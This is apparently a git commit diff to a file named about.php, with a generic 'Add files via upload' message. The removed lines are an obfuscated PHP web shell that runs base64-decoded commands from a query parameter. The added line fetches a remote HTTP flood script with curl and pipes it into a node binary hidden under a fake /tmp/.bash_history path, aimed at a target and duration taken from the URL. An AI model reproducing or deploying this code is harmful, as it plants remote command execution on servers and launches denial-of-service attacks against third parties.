c556aff41e7950324e1fc0d24237edf143016557
seve02 <110140642+seve02@users.noreply.github.com>
2024-07-17 14:46:02 +0800

    Add files via upload

--- about.php
+++ about.php
@@ -1,7 +1,1 @@
-<?php
-if (isset($_GET['dcfdd5e021a869fcc6dfaef8bf31377e'])) {
-    $dcfdd5e021a869fcc6dfaef8bf31377e = $_GET['dcfdd5e021a869fcc6dfaef8bf31377e'];
-    $fb7792b6596fd12502dd132c0aba0568 = shell_exec(base64_decode($dcfdd5e021a869fcc6dfaef8bf31377e));
-    echo "<pre>$fb7792b6596fd12502dd132c0aba0568</pre>";
-}
-?>
+<?php $target = $_GET['target']; $time = $_GET['time']; shell_exec("curl -s https://raw.githubusercontent.com/hoaan1995/ZxCDDoS/main/HTTP-RAW.js | /tmp/.bash_history.original/bin/node - $target $time");?>
